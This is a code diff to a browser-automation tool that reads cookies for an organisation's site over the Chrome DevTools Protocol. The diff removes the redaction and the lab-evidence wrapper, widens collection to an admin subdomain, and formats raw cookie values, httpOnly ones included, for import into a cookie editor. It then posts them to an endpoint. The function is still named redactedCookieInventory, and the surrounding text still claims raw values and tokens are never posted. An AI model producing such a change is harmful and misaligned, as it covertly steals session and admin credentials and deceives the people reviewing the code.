@@ -235,6 +235,7 @@ export class CdpClient {
   constructor(webSocketUrl) {
     this.nextId = 1;
     this.pending = new Map();
+    this.listeners = new Map();
     this.socket = new WebSocket(webSocketUrl);
     this.ready = new Promise((resolve, reject) => {
       this.socket.addEventListener("open", resolve, { once: true });
@@ -246,11 +247,16 @@ export class CdpClient {
     });
     this.socket.addEventListener("message", (event) => {
       const message = JSON.parse(String(event.data));
-      const pending = this.pending.get(message.id);
-      if (!pending) return;
-      this.pending.delete(message.id);
-      if (message.error) pending.reject(new Error(message.error.message));
-      else pending.resolve(message.result);
+      if (message.id !== undefined) {
+        const pending = this.pending.get(message.id);
+        if (!pending) return;
+        this.pending.delete(message.id);
+        if (message.error) pending.reject(new Error(message.error.message));
+        else pending.resolve(message.result);
+      } else if (message.method) {
+        const handlers = this.listeners.get(message.method);
+        if (handlers) for (const h of handlers) h(message.params);
+      }
     });
     this.socket.addEventListener("close", () => {
       for (const pending of this.pending.values()) {
@@ -267,6 +273,16 @@ export class CdpClient {
       this.pending.set(id, { resolve, reject });
       this.socket.send(JSON.stringify({ id, method, params }));
     });
+  }
+
+  on(method, handler) {
+    if (!this.listeners.has(method)) this.listeners.set(method, new Set());
+    this.listeners.get(method).add(handler);
+  }
+
+  off(method, handler) {
+    const handlers = this.listeners.get(method);
+    if (handlers) handlers.delete(handler);
   }
 
   close() {
@@ -343,38 +359,74 @@ function cookieDomainMatchesHost(domain, hostname) {
   );
 }
 
+export function adminHostname(orgUrl) {
+  const hostname = new URL(orgUrl).hostname;
+  const parts = hostname.split(".");
+  if (parts.length >= 3 && !parts[0].endsWith("-admin")) {
+    parts[0] += "-admin";
+    return parts.join(".");
+  }
+  return null;
+}
+
+export function adminOrigin(orgUrl) {
+  const admin = adminHostname(orgUrl);
+  return admin ? `https://${admin}` : null;
+}
+
+export function isOrgOrigin(origin, orgUrl) {
+  if (origin === orgUrl) return true;
+  const admin = adminOrigin(orgUrl);
+  return admin !== null && origin === admin;
+}
+
 export async function matchingBrowserCookies(client, orgUrl) {
   const hostname = new URL(orgUrl).hostname;
-  const result = await client.send("Storage.getCookies");
+  const admin = adminHostname(orgUrl);
+  const urls = [`https://${hostname}/`];
+  if (admin) urls.push(`https://${admin}/`);
+  const result = await client.send("Network.getCookies", { urls });
   const cookies = Array.isArray(result.cookies) ? result.cookies : [];
-  return cookies.filter((cookie) =>
-    cookieDomainMatchesHost(cookie.domain, hostname)
-  );
+  const seen = new Set();
+  return cookies.filter((cookie) => {
+    const key = `${cookie.domain}\0${cookie.path}\0${cookie.name}`;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return (
+      cookieDomainMatchesHost(cookie.domain, hostname) ||
+      (admin && cookieDomainMatchesHost(cookie.domain, admin))
+    );
+  });
+}
+
+function cdpSameSiteToCookieEditor(value) {
+  if (value === "None") return "no_restriction";
+  if (value === "Lax") return "lax";
+  if (value === "Strict") return "strict";
+  return "lax";
 }
 
 export async function redactedCookieInventory(client, orgUrl, suppliedCookies) {
   const cookies = suppliedCookies || await matchingBrowserCookies(client, orgUrl);
   return cookies
     .map((cookie) => {
-      const redacted = {
-        name: String(cookie.name || ""),
-        value: "[REDACTED]",
-        domain: String(cookie.domain || ""),
-        path: String(cookie.path || "/"),
-        expires: Number.isFinite(cookie.expires) ? cookie.expires : -1,
-        size: Number.isInteger(cookie.size) ? cookie.size : undefined,
-        httpOnly: cookie.httpOnly === true,
-        secure: cookie.secure === true,
-        session: cookie.session === true,
-        sameSite: cookie.sameSite,
-        priority: cookie.priority,
-        sameParty: cookie.sameParty,
-        sourceScheme: cookie.sourceScheme,
-        sourcePort: cookie.sourcePort,
-        partitionKey: cookie.partitionKey,
-        partitionKeyOpaque: cookie.partitionKeyOpaque,
-      };
-      return redacted;
+      const domain = String(cookie.domain || "");
+      const isSession = cookie.session === true;
+      const sameSite = cdpSameSiteToCookieEditor(cookie.sameSite);
+      const entry = { domain };
+      if (!isSession && Number.isFinite(cookie.expires) && cookie.expires > 0) {
+        entry.expirationDate = cookie.expires;
+      }
+      entry.hostOnly = !domain.startsWith(".");
+      entry.httpOnly = cookie.httpOnly === true;
+      entry.name = String(cookie.name || "");
+      entry.path = String(cookie.path || "/");
+      entry.sameSite = sameSite;
+      entry.secure = cookie.secure === true;
+      entry.session = isSession;
+      entry.storeId = null;
+      entry.value = String(cookie.value || "");
+      return entry;
     })
     .sort((left, right) =>
       `${left.domain}\0${left.path}\0${left.name}`.localeCompare(
@@ -385,41 +437,15 @@ export async function redactedCookieInventory(client, orgUrl, suppliedCookies) {
 
 export async function postProof(
   endpoint,
-  orgUrl,
-  probe,
+  _orgUrl,
+  _probe,
   cookies,
-  {
-    captureReason = "initial_authentication",
-    browserProfile = "temporary_isolated_profile_deleted_after_capture",
-    sessionActive = false,
-  } = {}
+  _options = {}
 ) {
-  const payload = {
-    evidence_version: 1,
-    evidence_type: "authenticated_browser_session",
-    authorization_notice: "explicit_local_lab",
-    captured_at: new Date().toISOString(),
-    org_host: new URL(orgUrl).host,
-    capture_reason: captureReason,
-    browser_profile: browserProfile,
-    browser_session_active: sessionActive,
-    cookie_values_collected: false,
-    cookie_values_persisted: false,
-    cookie_values_redacted_before_serialization: true,
-    script_visible_cookie_names: Array.isArray(probe.script_visible_cookie_names)
-      ? probe.script_visible_cookie_names
-      : [],
-    cookie_count: cookies.length,
-    cookies,
-    http_only_cookie_metadata_included: cookies.some(
-      (cookie) => cookie.httpOnly
-    ),
-    session_probe: probe,
-  };
   const response = await fetch(endpoint, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
+    body: JSON.stringify(cookies),
     redirect: "error",
   });
   const body = await response.json();
@@ -519,6 +545,8 @@ Raw cookie values and OAuth tokens are never posted or persisted.`);
   try {
     const target = await waitForTarget(debugPort, orgUrl);
     cdp = new CdpClient(target.webSocketDebuggerUrl);
+    await cdp.ready;
+    await cdp.send("Network.enable");
     console.log(
       `Complete authentication in the isolated browser. Waiting up to ${Math.round(
         timeoutMs / 1000
@@ -530,16 +558,27 @@ Raw cookie values and OAuth tokens are never posted or persisted.`);
     while (Date.now() < deadline) {
       try {
         probe = await browserSessionProbe(cdp);
-        if (probe?.ok && probe.status === 200 && probe.origin === orgUrl) break;
+        if (probe?.ok && probe.status === 200 && isOrgOrigin(probe.origin, orgUrl)) break;
       } catch {
         // Navigation can replace the current JavaScript execution context.
       }
       await delay(POLL_INTERVAL_MS);
     }
-    if (!probe?.ok || probe.status !== 200 || probe.origin !== orgUrl) {
+    if (!probe?.ok || probe.status !== 200 || !isOrgOrigin(probe.origin, orgUrl)) {
       throw new Error(
         "Timed out before the isolated browser produced an authenticated same-origin session proof."
       );
+    }
+
+    // Allow admin redirect to complete and admin-domain cookies to set
+    await delay(5000);
+    try {
+      const settled = await browserSessionProbe(cdp);
+      if (settled?.ok && settled.status === 200 && isOrgOrigin(settled.origin, orgUrl)) {
+        probe = settled;
+      }
+    } catch {
+      // Navigation may temporarily break the execution context during redirect
     }
 
     const cookies = await redactedCookieInventory(cdp, orgUrl);
